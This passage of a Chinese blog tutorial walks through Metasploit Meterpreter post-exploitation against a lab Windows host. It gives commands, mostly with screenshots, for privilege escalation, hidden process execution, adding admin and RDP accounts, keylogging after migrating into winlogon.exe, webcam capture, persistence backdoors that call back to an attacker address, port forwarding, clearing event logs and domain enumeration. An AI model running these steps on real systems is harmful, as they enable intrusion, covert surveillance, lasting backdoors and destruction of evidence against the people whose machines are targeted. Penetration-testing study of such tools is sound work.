  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload  file  <span class="comment">#命令则能够向目标系统上传文件。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/w2SWd3K1hpnMTEc.png" alt="img" /></p>
<h4 id="77-权限提升"><a class="markdownIt-Anchor" href="#77-权限提升"></a> 7.7 权限提升：</h4>
<blockquote>
<p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权。</p>
</blockquote>
<p>命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="comment">#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment">#自动提权为系统权限</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/ON4s9uQrjZxRkIz.png" alt="在这里插入图片描述" /></p>
<p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p>
<h4 id="78-获取用户密码"><a class="markdownIt-Anchor" href="#78-获取用户密码"></a> 7.8 获取用户密码：</h4>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501">点击进入：使用MSF抓取用户密码</a></p>
<h4 id="79-运行程序"><a class="markdownIt-Anchor" href="#79-运行程序"></a> 7.9 运行程序：</h4>
<p>先查看目标主机安装了哪些应用：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications  <span class="comment">#查看目标主机安装了哪些应用</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/Wma5ySTlhVp4AwG.png" alt="img" /></p>
<p>在meterpreter_shell命令行执行目标系统中的应用程序：<br />
命令:</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#execute命令用法：</span></span><br><span class="line">execute [参数] -f 指定的可执行文件</span><br><span class="line"></span><br><span class="line">-f：指定可执行文件</span><br><span class="line">-H：创建一个隐藏进程</span><br><span class="line">-a：传递给命令的参数</span><br><span class="line">-i：跟进程进行交互</span><br><span class="line">-m：从内存中执行</span><br><span class="line">-t：使用当前伪造的线程令牌运行进程</span><br><span class="line">-s：在给定会话中执行进程</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/3FR2WsApLVnUxom.png" alt="img" /></p>
<h4 id="711-屏幕截图"><a class="markdownIt-Anchor" href="#711-屏幕截图"></a> 7.11 屏幕截图：</h4>
<p>1、截图目标主机屏幕，可以看到，图片被保存到了<code>/root/桌面/</code>目录下：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot <span class="comment">#截图目标主机屏幕</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/tCeb1fu9wM6VaDI.png" alt="img" /><br />
2、目标主机的屏幕截图如下：</p>
<p><img src="https://s2.loli.net/2023/03/16/i8LAxqvXFyPlcRr.png" alt="img" /></p>
<h4 id="712-创建一个新账号"><a class="markdownIt-Anchor" href="#712-创建一个新账号"></a> 7.12 创建一个新账号：</h4>
<p>先查看目标主机有哪些用户：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users  <span class="comment">#查看目标主机有用户</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/yGuVkHhNsipQfRK.png" alt="img" /><br />
<strong>在目标系统中创建一个新的用户账号的方法一：</strong><br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run getgui -u 用户 -p 密码</span><br><span class="line">-u: 指定用户</span><br><span class="line">-p: 指定密码</span><br></pre></td></tr></table></figure>
<p><strong>注：这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。这里成功创建了用户，但是添加到Administrators组中失败了!</strong><br />
<img src="https://s2.loli.net/2023/03/16/v8tSAZH9VmsbqGe.png" alt="img" /><br />
如果添加到Administrators组中失败了的话，我们可以运行：shell ，进入cmd窗口手动将该用户添加到administrators组中。<br />
<strong>在目标系统中创建一个新的用户账号的方法二：</strong><br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enable_rdp脚本:</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=test2 PASSWORD=Abc123456  <span class="comment">#添加用户</span></span><br><span class="line">run post/windows/manage/enable_rdp                                    <span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=<span class="number">6662</span>            <span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/BpXohM9uVA4t3fS.png" alt="在这里插入图片描述" /><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1sh/p/13194235.html">点击进入：参考文章！</a></p>
<h4 id="713-启用远程桌面"><a class="markdownIt-Anchor" href="#713-启用远程桌面"></a> 7.13 启用远程桌面：</h4>
<p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p>
<p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），我们输入：<code>run post/windows/manage/enable_rdp</code>命令可以开启远程桌面。</p>
<p>在开启远程桌面会话之前，我们还需要使用<code>idletime命令</code>检查远程用户的空闲时长：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idletime <span class="comment">#检查远程用户的空闲时长</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/1ueF6YMqmAhHOx8.png" alt="在这里插入图片描述" /><br />
开启远程桌面：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/fCzeqaWBHNOtdv7.png" alt="img" /><br />
然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。</p>
<h4 id="714-键盘记录"><a class="markdownIt-Anchor" href="#714-键盘记录"></a> 7.14 键盘记录：</h4>
<p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start： <span class="comment">#开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；</span></span><br><span class="line">keyscan_dump：  <span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop：  <span class="comment">#停止键盘记录功能</span></span><br></pre></td></tr></table></figure>
<p>注：在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录。</p>
<h4 id="715-进程迁移"><a class="markdownIt-Anchor" href="#715-进程迁移"></a> 7.15 进程迁移：</h4>
<p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p>
<p>在下面的例子中，我们会将<code>Meterpreter</code>跟 <code>winlogon.exe</code>绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p>
<p>首先，我们需要使用：<code>ps</code> 命令查看目标设备中运行的进程：</p>
<p><img src="https://s2.loli.net/2023/03/16/e5AGK4dCZIQzgp6.png" alt="img" /><br />
我们可以使用：<code>getpid</code> 查看我们当前的进程id：</p>
<p><img src="https://s2.loli.net/2023/03/16/A3zd1g5BNhVmjl6.png" alt="img" /></p>
<p>使用：<code>migrate</code>+<code>目标进程ID</code>命令来绑定目标进程id，可以看到通过进程迁移后，当前的<code>Meterpreter</code>的<code>pid</code>已经和 <code>winlogon.exe</code>一样了：</p>
<p><img src="https://s2.loli.net/2023/03/16/cyqTpSDGNigHVkj.png" alt="img" /><br />
这里绑定目标pid的时候，经常会断了shell。进程迁移后会自动关闭原来Meterpreter进程，没有关闭可使用 <code>kill pid</code> 命令关闭进程。</p>
<p>或者使用自动迁移进程（<code>run post/windows/manage/migrate</code>）命令，系统会自动寻找合适的进程然后迁移。</p>
<h4 id="716-禁止目标主机使用键盘鼠标"><a class="markdownIt-Anchor" href="#716-禁止目标主机使用键盘鼠标"></a> 7.16 禁止目标主机使用键盘鼠标：</h4>
<p>命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uictl  <span class="title function_ invoke__">disable</span>(enable) keyboard  <span class="comment">#禁止(允许)目标使用键盘</span></span><br><span class="line">uictl  <span class="title function_ invoke__">disable</span>(enable) mouse     <span class="comment">#禁止(允许)目标使用鼠标</span></span><br></pre></td></tr></table></figure>
<h4 id="717-用目标主机摄像头拍照"><a class="markdownIt-Anchor" href="#717-用目标主机摄像头拍照"></a> 7.17 用目标主机摄像头拍照：</h4>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list    <span class="comment">#获取目标系统的摄像头列表</span></span><br><span class="line">webcam_snap    <span class="comment">#从指定的摄像头，拍摄照片</span></span><br><span class="line">webcam_stream  <span class="comment">#从指定的摄像头，开启视频</span></span><br></pre></td></tr></table></figure>
<p>获取目标系统的摄像头列表，可以看到目标主机有一个摄像头：</p>
<p><img src="https://s2.loli.net/2023/03/16/faAD1ErmioxH8MR.png" alt="img" /></p>
<p>可以指定的摄像头拍摄照片，可以看到已经获得从目标主机拍摄到的照片:<br />
<img src="https://s2.loli.net/2023/03/16/mk2dQstHTp47Yx8.png" alt="img" /></p>
<p>开启摄像头拍摄视频，会弹出一个网页，可以查看到摄像头那端的实时录像：<br />
<img src="https://s2.loli.net/2023/03/16/tRiOAoPXyzdEZJL.png" alt="img" /></p>
<h4 id="718-常用扩展库介绍"><a class="markdownIt-Anchor" href="#718-常用扩展库介绍"></a> 7.18 常用扩展库介绍：</h4>
<blockquote>
<p>meterpreter中不仅有基本命令还有很多扩展库，下面就介绍一下常用的扩展库的查看方法。</p>
</blockquote>
<h5 id="7181-loaduse命令"><a class="markdownIt-Anchor" href="#7181-loaduse命令"></a> 7.18.1 load/use命令：</h5>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load/<span class="keyword">use</span>     #加载模块</span><br><span class="line"><span class="title">load</span> -<span class="title">l</span>      #列出所有可用的扩展</span><br><span class="line"><span class="title">load</span> -<span class="title">help</span>   #帮助；说明</span><br></pre></td></tr></table></figure>
<p>输入命令：<code>load -l</code>会列出所有可用的扩展：<br />
<img src="https://s2.loli.net/2023/03/16/ciL73ugn9HkAQNF.png" alt="img" /><br />
输入<code>load</code>后，<code>双击Tab键</code>列出可用扩展：</p>
<p><img src="https://s2.loli.net/2023/03/16/uqwY8OrRyGWa4EB.png" alt="img" /></p>
<h5 id="7182-run命令"><a class="markdownIt-Anchor" href="#7182-run命令"></a> 7.18.2 run命令：</h5>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run   <span class="comment">#执行一个已有的模块</span></span><br><span class="line"><span class="comment">#run+双击Tab键，会列出所有的已有的脚本；</span></span><br><span class="line"><span class="comment">#常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等。</span></span><br></pre></td></tr></table></figure>
<p><code>run+双击Tab键</code>，会列出所有的已有的脚本:<br />
<img src="https://s2.loli.net/2023/03/16/KjuQHhXP7GFBg35.png" alt="img" /></p>
<p>注：这里输入run后，双击Tab键列出所有的已有的脚本；</p>
<h4 id="719-生成持续性后门"><a class="markdownIt-Anchor" href="#719-生成持续性后门"></a> 7.19 生成持续性后门：</h4>
<blockquote>
<p>因为<code>meterpreter</code> 是基于<code>内存DLL</code>建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p>
</blockquote>
<p>建立持续性后门有两种方法，一种是通过<code>启动项启动(persistence)</code>，一种是通过<code>服务启动(metsvc)</code></p>
<h5 id="7191-启动项启动"><a class="markdownIt-Anchor" href="#7191-启动项启动"></a> 7.19.1 启动项启动：</h5>
<p>启动项启动的话，我们先生成一个后门木马。<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/83869141">点击进入：用MSF生成一个后门木马!</a></p>
<p>然后放到<code>windows的启动目录</code>中：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
<p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p>
<h5 id="7192-服务启动"><a class="markdownIt-Anchor" href="#7192-服务启动"></a> 7.19.2 服务启动：</h5>
<p>通过服务启动，我们可以运行命令:</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run exploit/windows/local/persistence lhost=<span class="number">192.168</span>.<span class="number">100.132</span> lport=<span class="number">8888</span> <span class="comment">#自动连接192.168.100.158的8888端口，缺点是容易被杀毒软件查杀</span></span><br><span class="line"><span class="comment">#然后它就在目标机新建了这个文件：C:\Windows\TEMP\****.vbs ，并把该服务加入了注册表中，只要开机就会启动</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/75AaZ6b8uzmOxvS.png" alt="img" /><br />
我们在被攻击机可以看到这个文件，是一个VBScript脚本:</p>
<p><img src="https://s2.loli.net/2023/03/16/6YQlLshxqOMbTWS.png" alt="img" /><br />
查看靶机的端口连接情况，可以看到靶机连着我们的8888端口：</p>
<p><img src="https://s2.loli.net/2023/03/16/4g5pxWz2qoKcm3w.png" alt="img" /><br />
<a target="_blank" rel="noopener" href="https://hayalindekiyazilim.com/penetration/sizma-sonrasi/">点击进入：参考文章！</a></p>
<h4 id="720-设置socks代理"><a class="markdownIt-Anchor" href="#720-设置socks代理"></a> 7.20 设置Socks代理：</h4>
<p><a target="_blank" rel="noopener" href="https://xie1997.blog.csdn.net/article/details/105872076">点击进入：MSF搭建socks代理！</a></p>
<h4 id="721-portfwd端口转发"><a class="markdownIt-Anchor" href="#721-portfwd端口转发"></a> 7.21 portfwd端口转发：</h4>
<p>portfwd是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下:</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l <span class="number">9999</span> -r <span class="number">192.168</span>.<span class="number">100.158</span> -p <span class="number">3389</span>   </span><br><span class="line"><span class="comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">-l:   <span class="comment">#本地监听的端口，用于接收目标主机的端口反弹</span></span><br><span class="line">-p:   <span class="comment">#目标服务器的端口；</span></span><br><span class="line">add:  <span class="comment">#添加一个连接</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/dmZNF7eAqUDJsWz.png" alt="img" /></p>
<p>然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了:</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdesktop <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line"><span class="comment">#因为通过端口转发功能已经把3389的流量转发到本地的9999端口，所以只要连接本地的9999端口就相当于连接了目标机器的3389端口；</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/HcetUQoRTwf5sFb.png" alt="img" /></p>
<p><img src="https://s2.loli.net/2023/03/16/iRmTAfDBrzH5pje.png" alt="img" /></p>
<p>如果不想继续连接的话，可以删除当前建立的连接，执行以下命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd delet -l <span class="number">9999</span> -r <span class="number">192.168</span>.<span class="number">100.158</span> -p <span class="number">3389</span>   </span><br><span class="line">delet:  <span class="comment">#删除一个连接</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/DBzt8XanAQJO5xs.png" alt="img" /></p>
<h4 id="722-清除事件日志"><a class="markdownIt-Anchor" href="#722-清除事件日志"></a> 7.22 清除事件日志：</h4>
<p>完成攻击操作之后，千万别忘了&quot;打扫战场&quot;。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用以下命令来清除事件日志：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  <span class="comment">#清除事件日志</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/X8GAIozYtUDOhdf.png" alt="img" /></p>
<h3 id="8-导入并执行powershell脚本"><a class="markdownIt-Anchor" href="#8-导入并执行powershell脚本"></a> 8. 导入并执行PowerShell脚本：</h3>
<p>如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户:</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load powershell                           			<span class="comment">#加载powershell功能</span></span><br><span class="line">powershell_import /root/PowerView.ps1      			<span class="comment">#导入powershell脚本，提前将该powershell脚本放到指定目录</span></span><br><span class="line">powershell_execute Get-NetDomain           			<span class="comment">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块;获取当前用户所在域的名称;</span></span><br><span class="line">powershell_execute Invoke-UserHunter      			<span class="comment">#该功能模块用于定位域管理员登录的主机;</span></span><br><span class="line">powershell_execute Get-NetForest           			<span class="comment">#该模块用于定位域信息</span></span><br><span class="line">powershell_execute Invoke-EnumerateLocalAdmin 	    <span class="comment">#枚举域中所有计算机上本地管理员组的成员</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/HCMOelP4wBaARmF.png" alt="img" /><br />
<img src="https://s2.loli.net/2023/03/16/PJZsBCRjTvXtw6M.png" alt="img" /></p>
<h3 id="9-加载stdapi"><a class="markdownIt-Anchor" href="#9-加载stdapi"></a> 9. 加载stdapi：</h3>
<p>有时候虽然我们获取到了meterpreter，但是执行一些命令会显示没有该命令，这时我们可以执行：load stdapi来加载，这样我们就可以执行命令了。</p>
<p><img src="https://s2.loli.net/2023/03/16/eNEnsJpLcamfFWx.png" alt="img" /></p>
<h3 id="10-升级session"><a class="markdownIt-Anchor" href="#10-升级session"></a> 10. 升级Session：</h3>
<p>有时候，当我们收到的不是 meterpreter 类型的 session 的话，可能不好操作。我们可以执行命令 sessions -u id 来升级session。执行该命令，默认调用的是 post/multi/manage/shell_to_meterpreter 模块。</p>
<p><img src="https://s2.loli.net/2023/03/16/rZ1D8j4JP7hqSv5.png" alt="img" /></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">like4h</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/16/791080604.html">http://example.com/2023/03/16/791080604.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">like4h</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a><a class="post-meta__tags" href="/tags/MSF/">MSF</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/16/1905692189.html"><img class="prev-cover" src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022长安杯</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/24/120606809.html"><img class="next-cover" src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vue3学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/index/avater.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">like4h</div><div class="author-info__description">心中有梦，眼里有光</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/like4h"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/like4h" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:flyingjq@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">like4h's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text"> 一、实验环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text"> 二、简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-metasploit%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">3.</span> <span class="toc-text"> 三、Metasploit的安装和更新升级：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85msf"><span class="toc-number">3.1.</span> <span class="toc-text"> 1. 一键安装MSF：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-msf%E7%9A%84%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">3.2.</span> <span class="toc-text"> 2. MSF的更新升级：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21-%E9%9D%9Ekali%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7msf"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 2.1 非kali环境下更新升级MSF：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22-kali%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7msf"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 2.2 kali环境下更新升级MSF：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text"> 四、使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text"> 1. 基础使用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-msf%E4%B8%AD%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text"> 2. MSF中加载自定义的exploit模块：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8exploit"><span class="toc-number">4.3.</span> <span class="toc-text"> 3. 漏洞利用(exploit)：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7payload"><span class="toc-number">4.4.</span> <span class="toc-text"> 4. 攻击载荷(payload)：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#41-payload%E6%A8%A1%E5%9D%97%E8%B7%AF%E5%BE%84"><span class="toc-number">4.4.1.</span> <span class="toc-text"> 4.1 payload模块路径：：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#42-metasploit%E4%B8%AD%E7%9A%84-payload-%E6%A8%A1%E5%9D%97%E4%B8%BB%E8%A6%81%E6%9C%89%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.4.2.</span> <span class="toc-text"> 4.2 Metasploit中的 Payload 模块主要有以下三种类型：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-meterpreter"><span class="toc-number">4.5.</span> <span class="toc-text"> 5. Meterpreter：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#51-meterpreter%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-number">4.5.1.</span> <span class="toc-text"> 5.1 Meterpreter是如何工作的？：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#52-meterpreter%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.5.2.</span> <span class="toc-text"> 5.2 Meterpreter的特点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-ms17_010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">4.6.</span> <span class="toc-text"> 6. MS17_010(永恒之蓝)：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#61-%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="toc-number">4.6.1.</span> <span class="toc-text"> 6.1 查找漏洞相关模块：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#62-%E5%88%A9%E7%94%A8auxiliary%E8%BE%85%E5%8A%A9%E6%8E%A2%E6%B5%8B%E6%A8%A1%E5%9D%97%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.6.2.</span> <span class="toc-text"> 6.2 利用Auxiliary辅助探测模块对漏洞进行探测：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#63-%E4%BD%BF%E7%94%A8exploit%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">4.6.3.</span> <span class="toc-text"> 